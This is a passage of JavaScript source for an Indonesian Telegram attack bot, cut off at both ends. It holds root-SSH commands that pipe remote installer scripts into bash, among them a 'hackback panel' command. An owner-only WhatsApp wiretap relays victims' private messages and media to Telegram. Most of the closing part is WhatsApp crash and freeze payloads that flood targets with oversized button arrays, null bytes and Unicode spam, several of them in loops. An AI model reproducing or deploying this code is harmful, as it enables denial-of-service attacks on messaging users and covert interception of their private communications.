    .on("end", () => console.log("SSH Connection closed"))
    .connect(connSettings);
});

bot.onText(/^\/uninstallpanel(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];
  const userId = msg.from.id;

  // 🔒 Cek Premium Paling Awal
  if (!setting.PREM_IDS.includes(userId)) {
    return bot.sendMessage(chatId, '❌ Hanya user premium yang bisa menggunakan perintah ini!');
  }

  // Format wajib
  if (!text) {
    return bot.sendMessage(chatId, "❌ Format salah!\nContoh: /uninstallpanel ip|password");
  }

  const [ip, password] = text.split("|");
  if (!ip || !password) {
    return bot.sendMessage(chatId, "❌ Format salah!\nContoh: /uninstallpanel ip|password", { parse_mode: "Markdown" });
  }

  const conn = new Client();

  bot.sendMessage(chatId, `
📡 ᴍᴇɴɢʜᴜʙᴜɴɢᴋᴀɴ ᴋᴇ ᴠᴘꜱ *${ip}*
ꜱɪʟᴀʜᴋᴀɴ ᴛᴜɴɢɢᴜ 10-20 ᴍᴇɴɪᴛ...`, { parse_mode: "Markdown" });

  conn.on("ready", () => {

    conn.exec("bash <(curl -s https://pterodactyl-installer.se)", (err, stream) => {
      if (err) {
        conn.end();
        return bot.sendMessage(chatId, "❌ Gagal menjalankan installer.");
      }

      stream.on("close", (code) => {
        conn.end();

        if (code === 0) {
          bot.sendMessage(chatId, `
✅ *ꜱᴜᴋꜱᴇꜱ ᴜɴɪɴꜱᴛᴀʟʟ ᴘᴀɴᴇʟ!*`, 
          { parse_mode: "Markdown" });

        } else {
          bot.sendMessage(chatId, 
            `⚠️ ɪɴꜱᴛᴀʟʟᴇʀ ꜱᴇʟᴇꜱᴀɪ ᴅᴇɴɢᴀɴ ᴋᴏᴅᴇ ${code}. ʙᴇʙᴇʀᴀᴘᴀ ᴘᴇɴɢʜᴀᴘᴜꜱᴀɴ ᴍᴜɴɢᴋɪɴ ɢᴀɢᴀʟ. ᴄᴇᴋ ᴍᴀɴᴜᴀʟ ᴅɪ ᴠᴘꜱ.`
          );
        }
      });

      stream.on("data", (data) => {
        const out = data.toString();
        console.log("UNINSTALL >>", out);

        // Auto Input sesuai prompt installer
        if (out.includes("Input 0-6")) stream.write("6\n");
        if (out.includes("Do you want to remove panel? (y/N)")) stream.write("y\n");
        if (out.includes("Do you want to remove Wings (daemon)? (y/N)")) stream.write("y\n");
        if (out.includes("Continue with uninstallation? (y/N)")) stream.write("y\n");
        if (out.includes("Choose the panel database (to skip don't input anything)")) stream.write("\n");
        if (out.includes("Database called panel has been detected. Is it the pterodactyl database? (y/N)")) stream.write("y\n");
        if (out.includes("User called pterodactyl has been detected. Is it the pterodactyl user? (y/N)")) stream.write("y\n");
      });

      stream.stderr.on("data", (data) => {
        console.error("STDERR:", data.toString());
      });

    });

  })
  .on("error", (err) => {
    bot.sendMessage(chatId, `❌ Gagal konek ke VPS:\n${err.message}`);
  })
  .connect({
    host: ip,
    port: 22,
    username: "root",
    password: password,
    readyTimeout: 20000
  });

});

bot.onText(/^\/swings(?:\s+(.+))?/, async (msg, match) => {
  const users = loadData("users.json");
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;

  // 🔒 Cek Premium
  if (!setting.PREM_IDS.includes(userId)) {
    return bot.sendMessage(chatId, '❌ Hanya user premium yang bisa menggunakan perintah ini!');
  }

  const text = match[1];
  if (!text) {
    return bot.sendMessage(chatId, "❌ Format salah!\nContoh: /swings ipvps|pwvps|token_node");
  }

  const t = text.split("|");
  if (t.length < 3) {
    return bot.sendMessage(chatId, "❌ Format salah!\n\nContoh:\n/swings ipvps|pwvps|token_node");
  }

  const ipvps = t[0].trim();
  const passwd = t[1].trim();
  const token = t[2].trim();

  let logs = "🚀 Menjalankan proses wings...\n\n";
  const loadingMsg = await bot.sendMessage(chatId, logs);

  const connSettings = {
    host: ipvps,
    port: 22,
    username: "root",
    password: passwd,
    readyTimeout: 20000
  };

  const conn = new Client();
  const command = token;

  function updateLogs(newLine) {
    logs += newLine + "\n";
    safeEdit(bot, chatId, loadingMsg.message_id, "```\n" + logs.slice(-3500) + "\n```");
  }

  conn.on("ready", () => {
    updateLogs("✅ SSH Connected!");

    conn.exec(command, (err, stream) => {
      if (err) {
        updateLogs("❌ Gagal menjalankan token node.");
        return conn.end();
      }

      updateLogs("▶️ Menjalankan token...");

      stream.stdout.on("data", (data) =>
        updateLogs("TOKEN OUT: " + data.toString().trim())
      );
      stream.stderr.on("data", (data) =>
        updateLogs("TOKEN ERR: " + data.toString().trim())
      );

      stream.on("close", () => {
        updateLogs("✅ Token selesai, lanjut jalankan wings...");

        conn.exec("sudo wings", (err2, stream2) => {
          if (err2) {
            updateLogs("❌ Gagal menjalankan wings.");
            return conn.end();
          }

          updateLogs("▶️ Menjalankan wings...");

          stream2.stdout.on("data", (data) =>
            updateLogs("WINGS OUT: " + data.toString().trim())
          );
          stream2.stderr.on("data", (data) =>
            updateLogs("WINGS ERR: " + data.toString().trim())
          );

          stream2.on("close", () => {
            updateLogs(
              "✅ Wings berhasil dijalankan!\n\nJika masih merah:\n1. Login VPS di JuiceSSH\n2. Ketik `sudo wings --debug`\n3. Refresh panel"
            );
            conn.end();
          });
        });
      });
    });
  })
  .on("error", (err) => {
    updateLogs("❌ Connection Error: " + err.message);
  })
  .on("end", () => updateLogs("🔌 SSH Connection closed"))
  .connect(connSettings);
});


//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//HACKBACK PANEL
bot.onText(/^(\.|\#|\/)hbpanel$/, async (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `𝗙𝗼𝗿𝗺𝗮𝘁 𝘀𝗮𝗹𝗮𝗵!\n𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻: /hbpanel ipvps,pwvps`);
  });
bot.onText(/\/hbpanel (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const t = text.split(',');
  if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "Lu Siapa Jangan Berharap Lebih Menggunakan Perintah Ini",
            { parse_mode: "Markdown" }
        );
  }
  if (t.length < 2) {
    return bot.sendMessage(chatId, 'Format Salah!\nPenggunaan: /hbpanel ipvps,pwvps,token');
  }
  const ipvps = t[0];
  const passwd = t[1];

  const connSettings = {
    host: ipvps,
    port: 22,
    username: 'root',
    password: passwd
  };
    const conn = new Client();
    const command = 'bash <(curl -s https://raw.githubusercontent.com/LeXcZxMoDz9/Installerlex/refs/heads/main/install.sh)'
 
    conn.on('ready', () => {
        isSuccess = true; 
        bot.sendMessage(chatId,'PROSES HACK BACK PTERODACTYL')
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ${code} and ${signal} signal');
         bot.sendMessage(chatId, 'Data Panel Anda\n\nUsername: lexcz\nPassword: lexcz\n\n\n');
                conn.end();
            }).on('data', (data) => {
                stream.write('7\n');
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        bot.sendMessage(chatId, 'Katasandi atau IP tidak valid');
    }).connect(connSettings);
});

bot.onText(/^\/cekip(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const ip = match[1]?.trim();
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const isPremium = await premium (senderId);
  const chatType = msg.chat.type;
           
 if (isGroupOnly() && chatType === 'private') {
 return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/cekip')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}

if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷</blockquote>
use /addprem before using this command to be able to access 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}

  // Validasi IP address
  if (!ip || !/^\d{1,3}(\.\d{1,3}){3}$/.test(ip)) {
    return bot.sendMessage(
      chatId,
      "❌ *IP tidak valid!*\n\nContoh penggunaan:\n`/cekip 8.8.8.8`",
      { parse_mode: "Markdown" }
    );
  }

  try {
    await bot.sendChatAction(chatId, "typing");

    const res = await axios.get(`https://ipwho.is/${ip}`);
    const data = res.data;

    if (!data.success) {
      return bot.sendMessage(chatId, "❌ *IP tidak ditemukan atau tidak valid!*", {
        parse_mode: "Markdown",
      });
    }

    const {
      ip: ipAddress,
      continent,
      country,
      country_code,
      region,
      city,
      org,
      timezone,
      latitude,
      longitude,
    } = data;

    const gmapsUrl =
      latitude && longitude
        ? `🔗 *Google Maps:* [Klik di sini](https://maps.google.com/maps?q=${latitude},${longitude})`
        : "🔗 *Google Maps:* Tidak tersedia";

    const result = `📡 *IP WHOIS Lookup*
━━━━━━━━━━━━━━━━━━━━
🌐 *IP:* ${ipAddress}
🧭 *Continent:* ${continent || "-"}
🏳️ *Country:* ${country || "-"} (${country_code || "-"})
🏙️ *Region:* ${region || "-"}
📍 *City:* ${city || "-"}
🏢 *ISP:* ${org || "-"}
⏰ *Timezone:* ${timezone?.id || "-"}
📌 *Latitude:* ${latitude || "-"}
📌 *Longitude:* ${longitude || "-"}
${gmapsUrl}
━━━━━━━━━━━━━━━━━━━━`;

    return bot.sendMessage(chatId, result, {
      parse_mode: "Markdown",
      disable_web_page_preview: true,
    });

  } catch (err) {
    console.error("Error /cekip:", err.message || err);
    return bot.sendMessage(chatId, "❌ *Terjadi kesalahan saat mengambil data IP!*", {
      parse_mode: "Markdown",
    });
  }
});

function isOwner(userId) {
  return OWNER_ID.map(String).includes(String(userId));
}

function ownerOnly(bot, msg) {
  bot.sendMessage(msg.chat.id, "❌ Kamu *tidak memiliki izin*.", { parse_mode: "Markdown" });
}

bot.onText(/^\/wa_on$/, (msg) => {
  if (!isOwner(msg.from.id)) return ownerOnly(bot, msg);
  waMonitoring = true;
  bot.sendMessage(msg.chat.id, "✅ Sadap Whatsapp *aktif*.", { parse_mode: "Markdown" });
});

bot.onText(/^\/wa_off$/, (msg) => {
  if (!isOwner(msg.from.id)) return ownerOnly(bot, msg);
  waMonitoring = false;
  bot.sendMessage(msg.chat.id, "🚫 Sadap Whatsapp *dimatikan*.", { parse_mode: "Markdown" });
});

bot.onText(/^\/wa_status$/, (msg) => {
  if (!isOwner(msg.from.id)) return ownerOnly(bot, msg);
  bot.sendMessage(
    msg.chat.id,
    `📋 Monitoring: *${waMonitoring ? "ON ✅" : "OFF ❌"}*`,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/^\/listgroup (.+)$/, async (msg, match) => {
  if (!isOwner(msg.from.id)) return ownerOnly(bot, msg);
   
  const sessionNumber = match[1];
  const sock = sessions.get(sessionNumber);
  if (!sock)
    return bot.sendMessage(
      msg.chat.id,
      `⚠️ Sesi *${sessionNumber}* tidak ditemukan / belum aktif.`,
      { parse_mode: "Markdown" }
    );

  try {
    const groups = await sock.groupFetchAllParticipating();
    let text = `📋 *Daftar Grup Sesi ${sessionNumber}:*\n\n`;
    let count = 0;

    for (const id in groups) {
      const g = groups[id];
      text += `🔹 *${g.subject}*\n🆔 ${id}\n\n`;
      count++;
    }

    if (count === 0) text = "❌ Tidak ada grup yang ditemukan.";
    bot.sendMessage(msg.chat.id, text, { parse_mode: "Markdown" });
  } catch (err) {
    console.error(err);
    bot.sendMessage(msg.chat.id, `❌ ${err.message}`);
  }
});

bot.on("message", async (msg) => {
  if (!isOwner(msg.from.id)) return;
  if (msg.text && msg.text.startsWith("/kirimpesan")) {
    const args = msg.text.trim().split(" ");
    if (args.length < 3)
      return bot.sendMessage(
        msg.chat.id,
        "⚠️ Format salah!\nGunakan: /kirimpesan <session> <target> <pesan opsional>"
      );
      
    const sessionNumber = args[1];
    const target = args[2];
    const messageText = args.slice(3).join(" ") || "";
    const sock = sessions.get(sessionNumber);

    if (!sock)
      return bot.sendMessage(
        msg.chat.id,
        `⚠️ Sesi *${sessionNumber}* tidak ditemukan / belum aktif.`,
        { parse_mode: "Markdown" }
      );

    const jid = target.includes("@g.us") ? target : `${target}@s.whatsapp.net`;

    if (messageText) {
      try {
        await sock.sendMessage(jid, { text: messageText });
        bot.sendMessage(msg.chat.id, `✅ Pesan teks terkirim ke ${target}`);
      } catch (err) {
        console.error("Gagal kirim teks:", err);
        bot.sendMessage(msg.chat.id, `❌ ${err.message}`);
      }
    } else {
      bot.sendMessage(
        msg.chat.id,
        "📩 Sekarang *reply pesanmu* untuk dikirim ke WhatsApp.",
        { parse_mode: "Markdown" }
      );
    }
  }

  // ===== Mode reply kirim media / teks =====
  if (msg.reply_to_message && msg.reply_to_message.text?.startsWith("/kirimpesan")) {
    const match = msg.reply_to_message.text.match(/^\/kirimpesan\s+(\S+)\s+(\S+)/);
    if (!match) return;

    const sessionNumber = match[1];
    const target = match[2];
    const sock = sessions.get(sessionNumber);
    if (!sock)
      return bot.sendMessage(msg.chat.id, `⚠️ Sesi *${sessionNumber}* tidak aktif.`, {
        parse_mode: "Markdown",
      });

    const jid = target.includes("@g.us") ? target : `${target}@s.whatsapp.net`;
    const caption = msg.caption || msg.text || "";

    try {
      const getFileBuffer = async (fileId) => {
        const link = await bot.getFileLink(fileId);
        const res = await axios.get(link, { responseType: "arraybuffer" });
        return Buffer.from(res.data);
      };

      if (msg.photo) {
        const buffer = await getFileBuffer(msg.photo.at(-1).file_id);
        await sock.sendMessage(jid, { image: buffer, caption });
      } else if (msg.video) {
        const buffer = await getFileBuffer(msg.video.file_id);
        await sock.sendMessage(jid, { video: buffer, caption });
      } else if (msg.document) {
        const buffer = await getFileBuffer(msg.document.file_id);
        await sock.sendMessage(jid, {
          document: buffer,
          fileName: msg.document.file_name || "file",
          caption,
        });
      } else if (msg.audio) {
        const buffer = await getFileBuffer(msg.audio.file_id);
        await sock.sendMessage(jid, { audio: buffer, mimetype: "audio/mpeg" });
      } else if (msg.voice) {
        const buffer = await getFileBuffer(msg.voice.file_id);
        await sock.sendMessage(jid, { audio: buffer, ptt: true });
      } else if (msg.sticker) {
        const buffer = await getFileBuffer(msg.sticker.file_id);
        await sock.sendMessage(jid, { sticker: buffer });
      } else if (msg.text) {
        await sock.sendMessage(jid, { text: caption });
      } else {
        return bot.sendMessage(msg.chat.id, "⚠️ Jenis pesan ini belum bisa dikirim.");
      }

      bot.sendMessage(msg.chat.id, `✅ Pesan berhasil dikirim ke ${target}`);
    } catch (err) {
      console.error("Gagal kirim media:", err);
      bot.sendMessage(msg.chat.id, `❌ ${err.message}`);
    }
  }

  // ======================================================================
  // 🕹 FITUR /addstory <session> [teks opsional]
  // ======================================================================
  if (msg.text && msg.text.startsWith("/addstory")) {
    const args = msg.text.trim().split(" ");
    if (args.length < 2)
      return bot.sendMessage(
        msg.chat.id,
        "⚠️ Format salah!\nGunakan: /addstory <session> <teks opsional>"
      );

    const sessionNumber = args[1];
    const storyText = args.slice(2).join(" ") || "";
    const sock = sessions.get(sessionNumber);

    if (!sock)
      return bot.sendMessage(
        msg.chat.id,
        `⚠️ Sesi *${sessionNumber}* tidak ditemukan / belum aktif.`,
        { parse_mode: "Markdown" }
      );

    if (storyText) {
      try {
        await sock.sendMessage("status@broadcast", { text: storyText });
        bot.sendMessage(msg.chat.id, "✅ Story teks berhasil dikirim!");
      } catch (err) {
        console.error("Gagal kirim story teks:", err);
        bot.sendMessage(msg.chat.id, `❌ ${err.message}`);
      }
    } else {
      bot.sendMessage(
        msg.chat.id,
        "📸 Sekarang *reply pesan (foto/video + caption opsional)* untuk dijadikan story WhatsApp.",
        { parse_mode: "Markdown" }
      );
    }
  }

  // Mode reply media story
  if (msg.reply_to_message && msg.reply_to_message.text?.startsWith("/addstory")) {
    const match = msg.reply_to_message.text.match(/^\/addstory\s+(\S+)/);
    if (!match) return;

    const sessionNumber = match[1];
    const sock = sessions.get(sessionNumber);
    if (!sock) return bot.sendMessage(msg.chat.id, "⚠️ Sesi tidak aktif.");

    const caption = msg.caption || "";
    try {
      const getFileBuffer = async (fileId) => {
        const link = await bot.getFileLink(fileId);
        const res = await axios.get(link, { responseType: "arraybuffer" });
        return Buffer.from(res.data);
      };

      if (msg.photo) {
        const buffer = await getFileBuffer(msg.photo.at(-1).file_id);
        await sock.sendMessage("status@broadcast", { image: buffer, caption });
      } else if (msg.video) {
        const buffer = await getFileBuffer(msg.video.file_id);
        await sock.sendMessage("status@broadcast", { video: buffer, caption });
      } else {
        return bot.sendMessage(msg.chat.id, "⚠️ Kirim foto atau video untuk story.");
      }

      bot.sendMessage(msg.chat.id, "✅ Story berhasil diunggah!");
    } catch (err) {
      console.error("Gagal upload story:", err);
      bot.sendMessage(msg.chat.id, `❌ ${err.message}`);
    }
  }
});

// ============================================================================
// 📬 FORWARD PESAN MASUK KE TELEGRAM
// ============================================================================
async function forwardToTelegram(
  type,
  fromNumber,
  messageContent,
  sessionNumber,
  mediaBuffer = null,
  mimeType = null,
  isGroup = false,
  groupName = null,
  groupId = null,
  senderName = null
) {
  try {
    if (!NOTIF_ID) return;

    let caption = "";
    if (isGroup) {
      caption = `👥 *Grup:* ${groupName}\n🆔 *ID Grup:* ${groupId}\n👤 *Pengirim:* ${senderName || fromNumber}`;
    } else if (type === "out") {
      caption = `📤 *${sessionNumber} → ${fromNumber}*`;
    } else {
      caption = `📥 *${fromNumber} → ${sessionNumber}*`;
    }

    if (messageContent) caption += `\n💬 ${messageContent}`;

    if (mediaBuffer && mimeType) {
      if (mimeType.startsWith("image/"))
        await bot.sendPhoto(NOTIF_ID, mediaBuffer, { caption, parse_mode: "Markdown" });
      else if (mimeType.startsWith("video/"))
        await bot.sendVideo(NOTIF_ID, mediaBuffer, { caption, parse_mode: "Markdown" });
      else if (mimeType.startsWith("audio/"))
        await bot.sendAudio(NOTIF_ID, mediaBuffer, { caption });
      else {
        const ext = mime.extension(mimeType) || "bin";
        await bot.sendDocument(NOTIF_ID, mediaBuffer, {}, { filename: `file.${ext}` });
      }
    } else {
      await bot.sendMessage(NOTIF_ID, caption, { parse_mode: "Markdown" });
    }
  } catch (err) {
    console.error("Gagal kirim notifikasi Telegram:", err.message);
  }
}

// ============================================================================
// 📨 HANDLER PESAN MASUK DARI WHATSAPP
// ============================================================================
function attachMessageHandler(sock, botNumber) {
  if (sock._handlerAttached) return;
  sock._handlerAttached = true;

  sock.ev.on("messages.upsert", async (m) => {
    if (!waMonitoring) return;
    try {
      const msg = m.messages[0];
      if (!msg.message) return;

      const from = msg.key.remoteJid;
      const fromMe = msg.key.fromMe;
      const isGroup = from.endsWith("@g.us");
      const type = Object.keys(msg.message)[0];

      let text =
        msg.message.conversation ||
        msg.message.extendedTextMessage?.text ||
        msg.message[type]?.caption ||
        "";

      let buffer = null, mimetype = null;

      if (["imageMessage", "videoMessage", "audioMessage", "documentMessage"].includes(type)) {
        const stream = await downloadContentFromMessage(msg.message[type], type.replace("Message", ""));
        const chunks = [];
        for await (const c of stream) chunks.push(c);
        buffer = Buffer.concat(chunks);
        mimetype = msg.message[type].mimetype;
      }

      if (msg.message.call) text = "📞 *Panggilan Masuk*";

      if (isGroup) {
        const meta = await sock.groupMetadata(from);
        const sender = msg.key.participant?.split("@")[0];
        await forwardToTelegram(
          "in",
          sender,
          text,
          botNumber,
          buffer,
          mimetype,
          true,
          meta.subject,
          from,
          sender
        );
      } else {
        if (fromMe)
          await forwardToTelegram("out", from.split("@")[0], text, botNumber, buffer, mimetype);
        else
          await forwardToTelegram("in", from.split("@")[0], text, botNumber, buffer, mimetype);
      }
    } catch (err) {
      console.error("Error pesan WA:", err.message);
    }
  });
}

// ============================================================================
// 🔁 PASANG HANDLER UNTUK SEMUA SESSION
// ============================================================================
setInterval(() => {
  for (const [botNumber, sck] of sessions) {
    if (sck && !sck._handlerAttached) attachMessageHandler(sck, botNumber);
  }
}, 5000);


//---------------( FUNCTION ISI DISINI  )----------------\\
async function freezeXdelay(target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "XX"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg, {
    participant: target,
  });
  
  await sock.relayMessage("status@broadcast", {
    interactiveResponseMessage: {
      body: {
        text: "Click Here",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "call_permission_request",
        paramsJson: "FORM_SCREEN",
        version: 3
      },
      contextInfo: {
        remoteJid: Math.random().toString(36) + "CALL_ACCESS",
        isForwarded: true,
        forwardingScore: 999,
        urlTrackingMap: {
          urlTrackingMapElements: Array.from({ length: 500000 }, () => ({
            "\u0000": "Grettles"
          }))
        }
      }
    }
  }, {
    participant: target,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: { status_setting: "contacts" },
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: []
              }
            ]
          }
        ]
      }
    ]
  });
}

async function FcNewLowKinn(target) {
  const OPTS = { noSelfSync: true };
  const Z = "\u200B";
  const jid = target.includes("@") ? target : target.replace(/\D/g, "") + "@s.whatsapp.net";

  const sleep = ms => {
    if (typeof setTimeout === "function") return new Promise(r => setTimeout(r, ms));
    if (typeof globalThis !== "undefined" && typeof globalThis.setTimeout === "function")
      return new Promise(r => globalThis.setTimeout(r, ms));
    const start = Date.now();
    while (Date.now() - start < ms) {}
    return Promise.resolve();
  };

  const makePayload = (seed) => ({
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: Z + "\u927D" },
          header: { title: "\u200D" + Z.repeat(seed % 10) },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({ n: seed }))
          },
          nativeFlowResponsMessage: {
            buttons: [{ name: "one_crash_message_" + seed }]
          }
        }
      }
    }
  });

  for (let i = 0; i < 50; i++) {
    const batch = [];
    for (let j = 0; j < 20; j++) {
      batch.push(
        sock.relayMessage(jid, makePayload(i * 20 + j), {
          ...OPTS,
          messageId: "ScarryDeath" + Date.now().toString(36) + "_" + i + "_" + j
        }).catch(() => {})
      );
    }
    await Promise.all(batch);
    await sleep(1);
  }
}

async function GroupxCrash(groupJid) {
  await sock.relayMessage(groupJid, {
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          submessages: [{
            messageType: 8,
            latexMetadata: {
              text: "X",
              expressions: [{
                latexExpression: "X",
                url: "https://t.me/callmymell",
                height: 99999999,
                fontHeight: 1
              }]
            }
          }],
          contextInfo: {
            forwardingScore: 99999,
            isForwarded: true,
            forwardedAiBotMessageInfo: {
              botJid: "867051314767696@bot"
            },
            forwardOrigin: 4
          }
        }
      }
    }
  }, {
    isSecret: true
  });
}

async function iosCtt(target) {
  await sock.relayMessage(target, {
    contactMessage: {
      displayName: "- # MeyyCrashèr ん. " + "𑇂𑆵𑆴𑆿".repeat(10000),
      vcard: `BEGIN:VCARD
VERSION:3.0
N:;𑇂𑆵𑆴𑆿${"𑇂𑆵𑆴𑆿".repeat(10000)};;;
FN:𑇂𑆵𑆴𑆿${"𑇂𑆵𑆴𑆿".repeat(10000)}
NICKNAME:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
ORG:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
TITLE:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
item1.TEL;waid=6287873499996:+62 878-7349-9996
item1.X-ABLabel:Telepon
item2.EMAIL;type=INTERNET:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
item2.X-ABLabel:Kantor
item3.EMAIL;type=INTERNET:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
item3.X-ABLabel:Kantor
item4.EMAIL;type=INTERNET:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
item4.X-ABLabel:Pribadi
item5.ADR:;;𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)};;;;
item5.X-ABADR:ac
item5.X-ABLabel:Rumah
X-YAHOO;type=KANTOR:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
PHOTO;${null}
X-WA-BIZ-NAME:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
END:VCARD`,
      contextInfo: {
        externalAdReply: {
          automatedGreetingMessageShown: true,
          automatedGreetingMessageCtaType: "\0".repeat(100000),
          greetingMessageBody: "- # MeyyCrashèr ん."
        }
      }
    }
  }, {
    participant: true
  });
}

async function fiOSNew(target = 1) {
      for (let z = 0; z < target; z++) {
        await sock.relayMessage(target, {
          viewOnceMessage: {
            message: {
              buttonsMessage: {
                locationMessage: {
                  degreesLongitude: 0,
                  degreesLatitude: 0,
                  // jpegThumbnail: null,
                  name: "𑇂𑆵𑆴𑆿".repeat(9000)
                },
                contentText: "izin @mexxreall",
                buttons: [{
                  buttonId: "izin @mexxreall",
                  buttonText: {
                    displayText: "𑇂𑆵𑆴𑆿".repeat(1000)
                  },
                  type: 1
                }],
                headerType: 6
              }
            }
          }
        }, {
          isSecret: true
        });
        await new Promise((res) => setTimeout(res, 1000));
      }
    }

async function paySuck(groupJid) {
      await sock.relayMessage(groupJid, {
        interactiveMessage: {
          nativeFlowMessage: {
            buttons: [{
              name: "payment_info",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4UJPSC1FYKC\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"Â¿!deadcode!Â¿\",\"key\":\" ðª§" + "\0".repeat(902000) + "\",\"key_type\":\"CPF\"}}],\"share_payment_status\":false}"
            }]
          }
        }
      }, {});
    }

async function DelayXya(groupJid) {
      const msg1 = {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: "XXX"
              },
              nativeFlowMessage: {
                buttons: Array.from({
                  length: 500000
                }, () => ({}))
              }
            }
          }
        }
      };
      const msg2 = {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: "XXX"
              },
              nativeFlowMessage: {
                buttons: Array.from({
                  length: 500000
                }, () => ({}))
              }
            }
          }
        }
      };
      await sock.relayMessage(groupJid, msg1, {
        noSyncSelf: true
      });
      await sock.relayMessage(groupJid, msg2, {
        noSyncSelf: true
      });
      await new Promise(r => setTimeout(r, 1500));
    }

async function VnXDelayTagSw(target) {
 for (let z = 0; z < 70; z++) {
 await sock.relayMessage("status@broadcast", {
 groupStatusMessageV2: {
 message: {
 interactiveMessage: {
 body: {
 text: "Scarry Death"
 },
 nativeFlowMessage: {
 buttons: Array.from({ length: 500550 }, () => ({}))
 }
 }
 }
 }
 }, {
 statusJidList: [target],
 additionalNodes: [
 {
 tag: "meta",
 attrs: {},
 content: [{
 tag: "mentioned_users",
 attrs: {},
 content: [{
 tag: "to",
 attrs: { jid: target }
 }]
 }]
 }
 ]
 });
 }
}

async function ioscrshmel(target) {
  try {
    // Validasi dan perbaiki format JID target
    const targetJid = target.includes('@') ? target : `${target}@s.whatsapp.net`;

    await sock.relayMessage(targetJid, {
      botForwardedMessage: {
        message: {
          richResponseMessage: {
            messageType: 1,
            submessages: [],
            unifiedResponse: {
              data: Buffer.from(JSON.stringify({
                response_id: crypto.randomUUID(),
                sections: [
                  {
                    view_model: {
                      primitive: {
                        text: "D'synC - become the sync n great future",
                        inline_entities: ["{".repeat(500000)],
                        __typename: "GenAIMarkdownTextUXPrimitive",
                      },
                      __typename: "GenAISingleLayoutViewModel",
                    }
                  }
                ]
              }))
            },
            contextInfo: {
              forwardingScore: 1,
              isForwarded: true,
              forwardOrigin: 4,
              forwardedAiBotMessageInfo: {
                botJid: "0@bot"
              }
            }
          }
        }
      }
    }, {
      participant: true
    });

    console.log(`ioscrsh send to ${targetJid}`);
  } catch (err) {
    console.error("ioscrsh failed:", err.message);
  }
}

async function sendStatusTaght(target) {
    // Pastikan variabel 'sock' (atau nama client bot kamu) sudah terdefinisi di luar atau dikirim ke fungsi ini

    const messageContent = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Scarry Death" // Ubah teks sesuai kebutuhan (misal: "XXX")
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    // Mengirim ke jalur status broadcast
    await sock.relayMessage(
        "status@broadcast", 
        messageContent, 
        {
            // Memasukkan JID target ke list partisipan status
            statusJidList: [target], 
            
            // Menambahkan metadata untuk tag/mention target
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined
                                }
                            ]
                        }
                    ]
                }
            ]
        }
    );
}

async function crashStatusAdjgQ(target) {
    const jid = target.includes("@") ? target : target + "@s.whatsapp.net";
    const delay_ms = (ms) => new Promise(r => setTimeout(r, ms));
    const rand = (min, max) => min + Math.floor(Math.random() * (max - min));

    const msg = {
        viewOnceMessage: {
            message: {
                extendedTextMessage: {
